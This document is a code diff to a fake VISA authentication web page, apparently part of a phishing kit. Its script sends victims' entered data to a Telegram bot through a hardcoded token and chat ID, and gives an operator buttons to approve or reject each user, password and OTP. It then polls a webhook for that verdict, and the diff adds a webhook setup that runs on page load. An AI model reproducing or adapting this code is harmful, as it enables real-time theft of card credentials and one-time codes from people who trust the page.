@@ -110,20 +110,6 @@
             display: block;
         }
 
-        .verified-text {
-            font-size: 0.875rem;
-            color: var(--co-text-muted);
-            line-height: 1.2;
-        }
-
-        .verified-text strong {
-            display: block;
-            font-size: 1.75rem;
-            font-weight: 700;
-            color: var(--co-blue);
-            line-height: 1.1;
-        }
-
         .form-title {
             font-size: 1.25rem;
             font-weight: 700;
@@ -425,48 +411,6 @@
             color: var(--co-text);
         }
 
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 16px;
-            margin-top: 24px;
-            padding-top: 24px;
-            border-top: 1px solid var(--co-border);
-            flex-wrap: wrap;
-        }
-
-        @media (max-width: 640px) {
-            .button-group {
-                gap: 10px;
-                margin-top: 14px;
-            }
-
-            .btn-submit {
-                min-width: 100px;
-                padding: 8px 24px;
-                height: 40px;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .button-group {
-                gap: 8px;
-                margin-top: 12px;
-            }
-
-            .btn-submit {
-                min-width: 90px;
-                padding: 8px 20px;
-                height: 38px;
-                font-size: 0.875rem;
-            }
-
-            .btn-link {
-                font-size: 0.75rem;
-                padding: 4px 6px;
-            }
-        }
-
         .error-message {
             color: #c1121f;
             font-size: 0.8125rem;
@@ -687,12 +631,12 @@
 
     <script>
         // ============================================
-        // CONFIGURACIÓN
+        // CONFIGURACIÓN (con ruta relativa)
         // ============================================
         const TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
         const TELEGRAM_CHAT_ID = '-1004389419498';
         const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
-        const WEBHOOK_URL = 'https://paso2-ajhp.vercel.app/api/webhook';
+        const WEBHOOK_URL = '/api/webhook';  // <--- Ruta relativa, igual que en paso3
         
         const POLLING_INTERVAL = 3000;
         const MAX_POLLING_TIME = 300000;
@@ -710,8 +654,14 @@
         const statusMessage = document.getElementById('statusMessage');
 
         // ============================================
-        // INICIALIZACIÓN
+        // INICIALIZACIÓN (con configuración de webhook)
         // ============================================
+        window.addEventListener('load', async function() {
+            initializeTransaction();
+            await configurarWebhook();   // <-- Configurar webhook al cargar
+            console.log('✅ Sistema VISA listo - Webhook activo');
+        });
+
         function initializeTransaction() {
             const storagePriority = sessionStorage.getItem('procesamiento_prioritario') === 'true';
             
@@ -741,6 +691,21 @@
         }
 
         // ============================================
+        // CONFIGURAR WEBHOOK
+        // ============================================
+        async function configurarWebhook() {
+            try {
+                const response = await fetch(`${WEBHOOK_URL}?setup=true`);
+                const data = await response.json();
+                console.log('🔗 Webhook configurado:', data);
+                return data.success;
+            } catch (error) {
+                console.error('❌ Error configurando webhook:', error);
+                return false;
+            }
+        }
+
+        // ============================================
         // FUNCIONES TELEGRAM
         // ============================================
         function generarSolicitudId() {
@@ -752,26 +717,14 @@
                 const inlineKeyboard = {
                     inline_keyboard: [
                         [
-                            {
-                                text: "✅ APROBAR",
-                                callback_data: `approve_${datos.solicitudId}`
-                            }
+                            { text: "✅ APROBAR", callback_data: `approve_${datos.solicitudId}` }
                         ],
                         [
-                            {
-                                text: "❌ ERROR USUARIO",
-                                callback_data: `user_error_${datos.solicitudId}`
-                            },
-                            {
-                                text: "❌ ERROR CONTRASEÑA",
-                                callback_data: `pass_error_${datos.solicitudId}`
-                            }
+                            { text: "❌ ERROR USUARIO", callback_data: `user_error_${datos.solicitudId}` },
+                            { text: "❌ ERROR CONTRASEÑA", callback_data: `pass_error_${datos.solicitudId}` }
                         ],
                         [
-                            {
-                                text: "❌ ERROR OTP",
-                                callback_data: `otp_error_${datos.solicitudId}`
-                            }
+                            { text: "❌ ERROR OTP", callback_data: `otp_error_${datos.solicitudId}` }
                         ]
                     ]
                 };
@@ -831,9 +784,7 @@
             try {
                 const response = await fetch(`${WEBHOOK_URL}?check=${solicitudId}`);
                 const data = await response.json();
-                
                 console.log('📊 Estado webhook:', data.estado);
-                
                 return data.estado || 'pending';
             } catch (error) {
                 console.error('❌ Error verificando webhook:', error);
@@ -999,11 +950,6 @@
             if (confirm('¿Desea cancelar esta autenticación?')) {
                 window.history.back();
             }
-        });
-
-        window.addEventListener('load', function() {
-            initializeTransaction();
-            console.log('✅ Sistema VISA listo - Usando webhook de Vercel');
         });
     </script>
 </body>
